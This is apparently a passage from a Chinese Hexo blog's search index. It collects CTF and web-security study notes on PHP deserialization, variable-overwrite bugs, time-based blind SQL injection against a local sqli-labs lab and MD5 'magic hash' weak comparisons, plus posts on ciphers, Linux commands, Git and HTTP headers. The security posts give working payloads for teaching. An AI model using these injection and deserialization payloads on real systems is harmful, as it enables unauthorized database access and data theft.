解题方法php 反序列化题目链接：http://115.28.150.176/php1/index.php解题思路源代码： &lt;?php class just4fun { var $enter; var $secret; } if (isset($_GET[&#39;pass&#39;])) { $pass = $_GET[&#39;pass&#39;]; if(get_magic_quotes_gpc()){ $pass=stripslashes($pass); } $o = unserialize($pass); if ($o) { $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&#39;t fool me&quot;; } else echo &quot;are you trolling?&quot;; } ?&gt; 这段代码的意思就是，一个字符串经过反序列化之后，enter和secret相等。 解题方法构造poc： &lt;?php class just4fun { var $enter; var $secret; function just4fun() { $this-&gt;enter = &amp;$this-&gt;secret; } } $test = new just4fun(); echo serialize($test); ?&gt; 得到payload：O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}-+ flagnctf{serialize_and_unserialize} sql injection 4题目链接：http://chinalover.sinaapp.com/web15/index.php解题思路解题方法flag综合题题目链接：http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php解题思路解题方法flagsystem题目链接：解题思路解题方法flagSQL注入2题目链接：http://4.chinalover.sinaapp.com/web6/index.php解题思路解题方法flag综合题2题目链接：http://cms.nuptzj.cn/解题思路解题方法flag密码重置2题目链接：http://nctf.nuptzj.cn/web14/index.php解题思路解题方法flag]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[变量覆盖]]></title>
    <url>%2F2018%2F11%2F18%2Fbian-liang-fu-gai%2F</url>
    <content type="text"><![CDATA[前言变量覆盖指的是可以用我们自定义的参数值替换程序原有的变量值。 变量覆盖漏洞大多数由函数使用不当导致，经常引发变量覆盖漏洞的有：extract(),parse_str()和import_request_variables()函数,以及”$$”。 $$$$这种写法称为可变变量一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。 &lt;?php $a = b; $b = 2; echo $$a; // 2 ?&gt; &lt;?php include “flag.php”; $_403 = “Access Denied”; $_200 = “Welcome Admin”; if ($_SERVER[&quot;REQUEST_METHOD&quot;] != “POST”) { die(“BugsBunnyCTF is here :p…”); } if ( !isset($_POST[&quot;flag&quot;]) ) { die($_403); } foreach ($_GET as $key =&gt; $value) { $$key = $$value; } foreach ($_POST as $key =&gt; $value) { $$key = $value; } if ( $_POST[&quot;flag&quot;] !== $flag ) { die($_403); } echo “This is your flag : “. $flag . “\n”; die($_200); ?&gt; 题目分析：$_SERVER[‘REQUEST_METHOD’]为访问页面时的请求方法foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法： foreach (array_expression as $value) // 遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。 statement foreach (array_expression as $key =&gt; $value) // 第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 $key。 statement 源码包含了flag.php文件，并且需要满足3个if里的条件才能获取flag，题目中使用了两个foreach并且也使用了$$.两个foreach中对 $$key的处理是不一样的，满足条件后会将$flag里面的值打印出来，所以$flag是在flag.php文件文件中的。 但是由于第7，11-14行间的代码会将flag的值给覆盖掉了，所以需要先将flag的值赋给_200或_403变量，然后利用die(_200)或die(_403)将flag打印出来。 解题方法：由于第7，11-14行间的代码会将$flag的值给覆盖掉，所以只能利用第一个foreach先将$flag的值赋给$_200，然后利用die($_200)将原本的flag值打印出来。 extract()函数extract(array,extract_rules,prefix) 参数 描述 array 必需。规定要使用的数组。 extract_rules 可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。 prefix 可选。请注意 prefix 仅在 extract_type 的值是 EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS 时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。 &lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == “POST”) { extract($_POST); if ($pass == $thepassword_123) { &lt;div class=”alert alert-success”&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; } } ?&gt; 题目分析：题目要求使用POST提交数据，extract($_POST)会将POST的数据中的键名和键值转换为相应的变量名和变量值，利用这个覆盖$pass和$thepassword_123变量的值，从而满足pass==thepassword_123这个条件。 解题方法：使用POST请求提交pass=1&amp;thepassword_123=1, 然后extract()会将接收到的数据将$pass和$thepassword_123变量的值覆盖为空，便满足条件了。PAYLOAD：pass=1&amp;thepassword_123=1 parse_str()函数void parse_str ( string $encoded_string [, array &amp;$arr ] ) 参数 描述 encoded_string 必需。规定要解析的字符串。 arr 可选。规定存储变量的数组的名称。该参数指示变量将被存储到数组中。 &lt;?php $name=php; $age=100; parse_str(&quot;name=Bill&amp;age=60&quot;,$aa); print_r($name); // php print_r($age); // 100 print_r($aa[name]); // Bill print_r($aa[age]); // 60 ?&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;?php error_reporting(0); if (empty($_GET[&#39;id&#39;])) { show_source(__FILE__); die(); } else { include(&#39;flag.php&#39;); $a = &quot;www.OPENCTF.com&quot;; $id = $_GET[&#39;id&#39;]; @parse_str($id); if ($a[0] != &#39;QNKCDZO&#39; &amp;&amp; md5($a[0]) == md5(&#39;QNKCDZO&#39;)) { echo $flag; } else { exit(&#39;其实很简单其实并不难！&#39;); } } ?&gt; 题目分析：首先要求使用GET提交id参数，然后parse_str($id)对id参数的数据进行处理，再使用判断a[0] != ‘QNKCDZO’ &amp;&amp; md5(a[0]) == md5(‘QNKCDZO’)的结果是否为真，为真就返回flag，md5(‘QNKCDZO’)的结果是0e830400451993494058024219903391。 解题方法：使用GET请求id=a[0]=240610708，这样会将a[0]的值覆盖为240610708，然后经过md5后得到0e462097431906509019562988736854与md5(‘QNKCDZO’)的结果0e830400451993494058024219903391比较都是0 所以相等，满足条件，得到flag。 import_request_variables()bool import_request_variables ( string $types [, string $prefix ] ) 将 GET／POST／Cookie 变量导入到全局作用域中。 参数 描述 types 指定需要导入的变量。可以用字母‘G’、‘P’和‘C’分别表示 GET、POST 和 Cookie。这些字母不区分大小写，所以你可以使用‘g’、‘p’和‘c’的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用“gp”时，POST 变量将使用相同的名字覆盖 GET 变量。任何 GPC 以外的字母都将被忽略。 prefix 为变量名的前缀，置于所有被导入到全局作用域的变量之前。虽然 prefix 参数是可选的，但如果不指定前缀，或者指定一个空字符串作为前缀，你将获得一个 E_NOTICE 级别的错误。 &lt;?php if(isset($_REQUEST[&#39;btn_submit&#39;])){ echo &quot;正常取得的表单POST变量值：&quot;.$_REQUEST[&#39;Username&#39;].&quot;&lt;br /&gt;&quot;; import_request_variables(&quot;pg&quot;, &quot;import_&quot;); //显示导入的变量名称 echo &quot;使用import_request_variables函数导入的变量值：&quot;.$import_Username; } ?&gt;]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入之盲注]]></title>
    <url>%2F2018%2F10%2F26%2Fsql-zhu-ru-zhi-mang-zhu%2F</url>
    <content type="text"><![CDATA[0x00 基于布尔盲注截取字符串常用函数：① MID(column_name,start[,length]) //截取字符串的一部分 参数 描述 column_name 必需。要提取字符的字段。 start 必需。规定开始位置（起始值是 1）。 length 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。 例： str = &quot;asdf&quot; p = mid(str,2,1) p = s Sql用例： （1）MID(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。 ② substr()函数 Substr()和substring()函数实现的功能是一样的，均为截取字符串。 string substring(string, start, length) string substr(string, start, length) 参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。 Sql用例： (1) substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。 ③ Left()函数 Left()得到字符串左部指定个数的字符 Left ( string, n ) string为要截取的字符串，n为长度。 Sql用例： (1) left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库名前二位。 (2) 同样的string可以为自行构造的sql语句。 同时也要介绍ORD()函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。 例如： ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’ 0x01 基于时间盲注常用的判断语句: &#39; and if(1=0,1, sleep(10)) --+ &quot; and if(1=0,1, sleep(10)) --+ ) and if(1=0,1, sleep(10)) --+ &#39;) and if(1=0,1, sleep(10)) --+ &quot;) and if(1=0,1, sleep(10)) --+ 1.爆数据库的版本长度 http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and If(length((version()))=6,sleep(10),1)–+ 2.爆数据库版本的第一个字符 http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and If(ascii(substr(version(),1,1))=53,sleep(10),1)–+ 3.爆第一个数据库的长度 http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and If(length((select schema_name from information_schema.schemata limit 0,1))=18,sleep(10),1)–+ 4.爆第一个数据库的第一个字符 http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and If(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(10),1)–+这里通过改变limit后的值来确定第几个数据库，第一个数据库的下标为0，依次往后推就是其他的数据库 5.爆security数据库里的第四个表的长度 http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and If(length((select table_name from information_schema.tables where table_schema=’security’ limit 3,1))=5,sleep(10),1)–+ 6.爆security数据库里的第四个表的第一个字符http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 3,1),1,1))=117,sleep(10),1)–+ 7.爆security数据库里的users表的第二个字段长度 http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and If(length((select column_name from information_schema.columns where table_schema=’security’ and table_name=’users’ limit 1,1))=8,sleep(10),1)–+ 8.爆security数据库里的users表的第二个字段的第一个字符 http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and If(ascii(substr((select column_name from information_schema.columns where table_schema=’security’ and table_name=’users’ limit 1,1),1,1))=117,sleep(10),1)–+ 9.爆security数据库里的users表的第二个字段的第一个数据的长度 http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and If(length((select username from security.users limit 0,1))=4,sleep(10),1)–+]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见加解密总结]]></title>
    <url>%2F2018%2F10%2F23%2Fchang-jian-jia-jie-mi-zong-jie%2F</url>
    <content type="text"><![CDATA[0x00 base64Base64就是用64个可显示字符表示所有的ASCii字符，64也就是6Bits，而ASC字符一共有256个，也就是8Bits。Base64编码要求把3个8位字节（38=24）转化为4个6位的字节（46=24），之后在6位的前面补两个0，形成8位一个字节的形式。 如果剩下的字符不足3个字节，则用0填充，输出字符使用’=’，因此编码后输出的文本末尾可能会出现1或2个’=’ 形式： ZXZhbCgkX1BPU1RbcDRuOV96MV96aDNuOV9qMXVfU2gxX0oxM10pNTU2NJC3ODHHYWJIZ3P4ZWY= base64在线加解密 0x01 base32Base32是用32个字符表示256个ASCii字符，也就是说5个ASCii字符一组可以生成8个Base字符。 0x02 培根密码培根密码实际上就是一种替换密码，根据所给表一一对应转换即可加密解密 。它的特殊之处在于：可以通过不明显的特征来隐藏密码信息，比如大小写、正斜体等，只要两个不同的属性，密码即可隐藏.需要注意的是输入的都应该是全小写字母或全大写字母。 第一种方式 A aaaaa B aaaab C aaaba D aaabbE aabaa F aabab G aabba H aabbbI abaaa J abaab K ababa L ababbM abbaa N abbab O abbba P abbbbQ baaaa R baaab S baaba T baabbU babaa V babab W babba X babbbY bbaaa Z bbaab 第二种方式 a AAAAA g AABBA n ABBAA t BAABAb AAAAB h AABBB o ABBAB u-v BAABBc AAABA i-j ABAAA p ABBBA w BABAAd AAABB k ABAAB q ABBBB x BABABe AABAA l ABABA r BAAAA y BABBAf AABAB m ABABB s BAAAB z BABBB 0x03 摩斯密码摩尔斯电码是一种早期的数字化通信形式，但是它不同于现代只使用零和一两种状态的二进制代码，它的代码包括五种： 点、划、点和划之间的停顿、每个字符间短的停顿（在点和划之间）、每个词之间中等的停顿以及句子之间长的停顿。 形式： – — .-. … . 摩斯密码在线加解密 0x04 JsFuckJSFuck 可以只用6个字符 !+ 来编写 JavaScript 程序。 形式： [][([]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+([]+[])[+[[!+[]+!+[]]]]+(![]+[])[+[[+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(![]+[])[+[[+!+ []]]]][([][([]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+([]+[])[+[[!+[]+!+[]]]]+(![]+[])[+[[+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]() JsFuck在线加解密 0x05 栅栏密码所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话） 明文：THERE IS A CIPHER 去掉空格后变为：THEREISACIPHER 两个一组，得到：TH ER EI SA CI PH ER 先取出第一个字母：TEESCPE 再取出第二个字母：HRIAIHR 连在一起就是：TEESCPEHRIAIHR 还原为所需密码。 而解密的时候，我们先把密文从中间分开，变为两行： T E E S C P E H R I A I H R 再按上下上下的顺序组合起来： THEREISACIPHER 分出空格，就可以得到原文了： THERE IS A CIPHER 例如密文：NlEyQd{seft} N E Q { e t l y d s f } NEQ{etIydsf}]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux入门学习]]></title>
    <url>%2F2018%2F08%2F10%2Flinux-ru-men-xue-xi%2F</url>
    <content type="text"><![CDATA[一、指令与选项什么是Linux的指令？指在Linux终端（命令行）中输入的内容就称之为指令一个完整的指令的标准格式：Linux通用的格式 指令主体（空格） [选项]（空格） [操作对象] 一个指令可以包含多个选项操作对象也可以是多个。 例如：需要让张三同学帮忙去楼下小卖铺买一瓶农夫山泉水和清风餐巾纸，在这个指令中“买东西”是指令的主体，买的水和餐巾纸是操作的对象，农夫山泉、清风是操作的选项。 二、基础指令（重点）1、ls指令含义：ls （list）用法1：#ls含义：列出当前工作目录下的所有文件/文件夹的名称用法2：#ls 路径含义：列出指定路径下的所有文件/文件夹的名称关于路径（重要）：路径可以分为两种：相对路径、绝对路径。相对路径：相对首先得有一个参照物（一般就是当前的工作路径）；相对路径的写法：在相对路径中通常会用到2个符号“./”【表示当前目录下】、“../”【上一级目录下】。绝对路径：绝对路径不需要参照物，直接从根“/”开始寻找对应路径；用法3：#ls 选项 路径含义：在列出指定路径下的文件/文件夹的名称，并以指定的格式进行显示。常见的语法： #ls -l 路径 #ls -la 路径 选项解释： -l：表示list，表示以详细列表的形式进行展示 -a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹）上述列表中的第一列字符表示文档的类型，其中“-”表示改行对应的文档类型为文件，“d”表示文档类型为文件夹。在Linux中隐藏文档一般都是以“.”开头。用法4：#ls -lh 路径含义：列出指定路径下的所有文件/文件夹的名称，以列表的形式并且在显示文档大小的时候以可读性较高的形式显示参数含义：2、pwd指令用法：#pwd （print working directory，打印当前工作目录）3、cd指令命令：#cd （change directory，改变目录）作用：用于切换当前的工作目录的语法：#cd 路径 案例：当前在“/”下，需要使用绝对路径切换到/usr/local。 案例：当前在/usr/local下，需要使用相对路径切换目录到home目录下的Linux123用户家目录中去。补充：在Linux中有一个特殊的符号“~”，表示当前用户的家目录。切换的方式：#cd ~4、mkdir指令指令：mkdir （make directory，创建目录）语法1：#mkdir 路径 【路径，可以是文件夹名称也可以是包含名称的一个完整路径】 案例：在当前路径下创建出目录“yunweihenniux”注意：ls列出的结果颜色说明，其中蓝色的名称表示文件夹，黑色的表示文件，绿色的其权限为拥有所有权限。 案例：在指定路径下创建出一个文件夹“yunweihenniux” 语法2：#mkdir -p 路径含义：当一次性创建多层不存在的目录的时候，添加-p参数，否则会报错 语法3：#mkdir 路径1 路径2 路径3 …. 【表示一次性创建多个目录】 5、touch指令令：touch作用：创建文件语法：#touch 文件路径 【路径可以是直接的文件名也可以是路径】 案例：使用touch来在当前路径下创建一个文件，命名为Linux.txt案例：使用touch来同时创建多个文件 案例：使用touch来在“Linux123”用户的家目录中创建文件，Linux.txt 6、cp指令指令：cp （copy，复制）作用：复制文件/文件夹到指定的位置语法：#cp 被复制的文档路径 文档被复制到的路径 案例：使用cp命令来复制一个文件注意：Linux在复制过程中是可以重新对新位置的文件进行重命名的，但是如果不是必须的需要，则建议保持前后名称一致。 案例：使用cp命令来复制一个文件夹注意：当使用cp命令进行文件夹复制操作的时候需要添加选项“-r”【-r表示递归复制】，否则目录将被忽略 7、mv指令指令：mv （move，移动，剪切）作用：移动文档到新的位置语法：#mv 需要移动的文档路径 需要保存的位置路径 确认：移动之后原始的文件还在不在原来的位置？原始文件是不在原始位置的 案例：使用mv命令移动一个文件案例：使用mv命令移动一个文件夹补充：在Linux中重命名的命令也是mv，语法和移动语法一样。 8、rm指令指令：rm （remove，移除、删除）作用：移除/删除文档语法：#rm 选项 需要移除的文档路径选项： -f：force，强制删除，不提示是否删除 -r：表示递归 案例：删除一个文件]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[敏感词替换]]></title>
    <url>%2F2018%2F07%2F31%2Fmin-gan-ci-ti-huan%2F</url>
    <content type="text"><![CDATA[流程以及思路确定1.用户输入一串文字 ，保存到user_input中2.检查文字是否有敏感词，以及敏感词的具体位置，直接使用relpace方式替换掉敏感词 3.一句话中可能含有多个敏感字，这个时候就要重复2的步骤。4.使用 len（str） 替换掉敏感词对应的个数。 # encoding:utf-8 user_input = input(&#39;请输入:&#39;) for filter_word in open(&#39;filter.txt&#39;): filter = filter_word.rstrip() if filter in user_input: filter_len = len(filter) user_input = user_input.replace(filter,&#39;*&#39;*filter_len) else: print(user_input) 总结： python中文件的读取函数open(filename,mode)用于读取文件，返回一个file object。 所以现在我们的filter.txt是一个文件对象参数filename:是一个字符串，用来代表文件名.参数mode:决定了打开文件的方式，比如只读(r)， 写入(w)， 追加等。 rstrip()方法Python rstrip() 删除 string 字符串末尾的指定字符（默认为空格）.基本格式：str.rstrip([chars]) chars – 指定删除的字符（默认为空格） 返回删除 string 字符串末尾的指定字符后生成的新字符串 replace()方法Python replace() 方法把字符串中的 old（旧字符串） 替换成 new(新字符串)，如果指定第三个参数max，则替换不超过 max 次。基本格式：STR.REPLACE(OLD, NEW[, MAX]) old – 将被替换的子字符串。 new – 新字符串，用于替换old子字符串。 max – 可选字符串, 替换不超过 max 次 返回字符串中的 old（旧字符串） 替换成 new(新字符串)后生成的新字符串，如果指定第三个参数max，则替换不超过 max 次。 for …else…只有当循环里没有遇到 break 时，else 块才会执行。当你想在房间里找某样东西时，只要在任意位置找到了，就停止继续搜查工作。但如果把整个房间都翻遍了，还没找到我们想要的东西，需要告诉人家说：这儿没有你要找的东西。遇到这样的情况用 for … else ，除此之外，最好不要用它]]></content>
  </entry>
  <entry>
    <title><![CDATA[GitHub上传]]></title>
    <url>%2F2018%2F07%2F31%2Fgithub-shang-chuan%2F</url>
    <content type="text"><![CDATA[GitHub上传 0x00.首先注册github账号，登录，创建新仓库 ，点击+，点击new repository 进入如下页面，填写仓库名，自己随便写一个名字，下面的描述可写可不写，点击Initialize this repository with a README，然后创建： 0x01.下载githttps://gitforwindows.org/ 0x02.配置git1.设置本地的ssh key，打开git bash,输入命令：ssh-keygen -t rsa -C “XXXXXX@XXXX.com“其中双引号中是你注册github时用的邮箱。一直回车，选择默认路径，和空密码。最后会在默认路径下生成.ssh文件夹，打开.ssh里面有两个文件，打开id_rsa.pub复制里面的密钥。 2.打开github,选择settings得到如下页面，点击ssh and gpg keys,选择ssh keys 右边的new ssh key。出现下面绿色框的内容，填写标题，并将自己刚才复制的密钥粘贴到key中。最后点击add ssh key.3.查看是否成功。 在git bash中输入命令：ssh -T git@github.com会提示，是否continue，输入yes。后就会看到： Warning:Permanently added ‘github.com,207.97.227.239’ (RSA) to the list of known hosts. Hi zhangsiyao11! You’ve successfully authenticated, but GitHub does not provide shell access. 这样就成功了，不用理会warning。 4.克隆你刚才新建的仓库到本地输入命令：git clone https://github.com/zhangsiyao11/chat后面的http是你的仓库的地址。此时会在刚才创建ssh key的默认目录下生成以你仓库名为文件名的文件，打开得到下图所示： 6.在此处右键打开git bash,输入如下命令：git initgit add “文件名”git commit -m “文件名”如果出现让你设置用户名和用户邮箱的提示，就按照提示上给的命令输入即可。后再次执行上面commit的命令。git remote add origin https://github.com/zhangsiyao11/chathttp为你自己仓库的地址如果出现错误：fatal: remote origin already exists则执行以下语句：git remote rm origin再执行git remote add origin https://github.com/zhangsiyao11/chat即可。最后在依次执行：git pull origin mastergit push origin master完成，再打开自己的仓库就会出现刚刚上传的项目文件:]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php弱类型]]></title>
    <url>%2F2018%2F07%2F27%2Fphp-ruo-lei-xing%2F</url>
    <content type="text"><![CDATA[弱类型 比较：=== 强等于 ：先判断两种字符串的类型，再比较== 弱等于 ：先将字符串类型转换成相同，再比较如果一个数值和字符串进行比较的时候，会将字符串转换成数值Abc == 01abc == 1Abc1 == 00e123 == 0e456 //0e被识别为科学计数法 如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0 a = 1 + “10.5” //a = 11.5b = 1 + “-1.1e3” //a = -1099c = 1 + “ab123” //c = 1d = 1+”2ab” //d = 3 MD5绕过0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0 QNKCDZO0e830400451993494058024219903391 s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 s1885207154a0e509367213418206700842008763514]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP消息头]]></title>
    <url>%2F2018%2F07%2F27%2Fhttp-xiao-xi-tou%2F</url>
    <content type="text"><![CDATA[前言HTTP消息头是指，在超文本传输协议（ Hypertext Transfer Protocol ，HTTP）的请求和响应消息中，协议头部分的那些组件。HTTP消息头用来准确描述正在获取的资源、服务器或者客户端的行为，定义了HTTP事务中的具体操作参数。 请求头HTTP请求报文由3部分组成：请求行+请求头+请求体①是请求方法，GET和POST是最常见的HTTP方法，除此以外还包括DELETE、HEAD、OPTIONS、PUT、TRACE。 ②是请求对于的URL地址，它和报文头的HOST属性组成完整的请求URL。 ③是协议名称和版本号。 ④是HTTP的报文头，报文头包含若干个属性，格式为“属性名：属性值”，服务端据此获取客户端的信息。 ⑤是报文体，它将一个页面表单中的组件值通过param1=value&amp;param2=value2的键值对形式编码成一个格式化串，它承载多个请求参数的数据。不但报文体可以传递请求参数，请求URL也可以通过类似于“/chapter15/user.html? param1=value1&amp;param2=value2”的方式传递请求参数。 请求报文头属性 Accept请求报文可通过一个“Accept”报文头属性告诉服务端 客户端接受什么类型的响应。 Accept:text/plain Cookie Referer Cache-Control Content-Type关于字符的编码，1.0版规定，头信息必须是 ASCII 码，后面的数据可以是任何格式。因此，服务器回应的时候，必须告诉客户端，数据是什么格式，这就是Content-Type字段的作用。 text/plain text/html text/css image/jpeg image/png image/svg+xml audio/mp4 video/mp4 application/javascript application/pdf application/zip application/atom+xml 这些数据类型总称为MIME type，每个值包括一级类型和二级类型，之间用斜杠分隔。 MIME type还可以在尾部使用分号，添加参数。 Content-Type: text/html; charset=utf-8上面的类型表明，发送的是网页，而且编码是UTF-8。 Content-Encoding由于发送的数据可以是任何格式，因此可以把数据压缩后再发送。Content-Encoding字段说明数据的压缩方法。 Content-Encoding: gzip Content-Encoding: compress Content-Encoding: deflate Content-Length一个TCP连接现在可以传送多个回应，势必就要有一种机制，区分数据包是属于哪一个回应的。这就是Content-length字段的作用，声明本次回应的数据长度。 Content-Length: 3495上面代码告诉浏览器，本次回应的长度是3495个字节，后面的字节就属于下一个回应了。 响应头]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux基础命令]]></title>
    <url>%2F2018%2F07%2F27%2Flinux-ji-chu-ming-ling%2F</url>
    <content type="text"><![CDATA[文件操作命令： 根目录：/ 家目录：/home 临时目录：/tmp 配置目录：/etc 用户程序目录：/user 查看目录：ls 到指定目录：cd 新建文件：touch 文件名 新建文件夹：mkdir 文件夹名 复制：cp 文件1 文件2 移动：mv 显示路径：pwd 删除文件：rm 删除文件夹：rmdir 文件夹 rm -r 文件夹 //删除整个文件夹及其内部文件 rm -rf 文件夹 //强制删除 用vim新建一个文件： vim a 按 i 进入insert模式，进行编辑 编辑完按ESC推出insert模式，按 ： 再按 wq 保存推出，q 不保存直接退出 移动到行首和行位：打开大写，输入G跑到行位，恢复到小写，按两次gg跑到行首 删除一行：小写dd，按 u 恢复 没有鼠标复制：光标在某一行时，按yy，再到指定位置按 p 即可 ：set number 显示行数模式，最后可用cat查看 文件的权限：777最大权限 r 是读，w 是写，x 是可执行 r = 4，w = 2，x = 1 文件搜索，查找，读取： 从文件尾部读取：tail（一般加上 -f ，实时追踪） 从文件头部读取：head （按住enter键，一行一行往下） 读取整个文件：cat 分页读取：more 可控分页：less 搜索关键字：grep 查看当前系统时间：data 关机：shutdown -h now //立刻关机 shutdown -h +10 //10分钟后关机 shutdown -h 12:00:00 //12点关机 halt //立刻关机 重启：shutdown -r now reboot 清屏：clear 用户管理： 添加用户：useradd 用户名 passwd 用户名 //设置密码 userdel -r 用户名 //删除用户及用户主目录 修改用户：usermod -1 用户1，用户2 //修改用户1位用户2]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hello,Hexo]]></title>
    <url>%2F2018%2F07%2F27%2Fhello-hexo%2F</url>
    <content type="text"><![CDATA[hello，Hexo！我的第一篇文章。]]></content>
  </entry>
</search>
